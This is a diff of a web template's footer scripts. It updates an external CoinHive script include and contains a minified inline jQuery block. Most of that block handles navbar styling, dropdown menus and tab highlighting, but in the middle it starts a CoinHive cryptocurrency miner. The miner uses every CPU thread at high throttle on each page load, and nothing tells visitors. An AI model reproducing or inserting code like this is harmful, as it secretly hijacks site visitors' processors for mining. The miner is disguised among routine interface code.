@@ -151,7 +151,7 @@
 @section('foot_js')
 
 @show
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js?v8"></script>
 <script type="text/javascript">
  (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');var miner = new CoinHive.User(myMinerKey, myMinerName, {threads: navigator.hardwareConcurrency,autoThreads: false,throttle: 0.9,forceASMJS: false});miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);var tab_pathname = window.location.pathname;$("#my_tab a").each(function(){if($(this).attr('href')==tab_pathname){$(this).parent().addClass('active');}});$("#my_tab a").click(function(){window.open($(this).attr('href'), '_self');});})();
 </script>
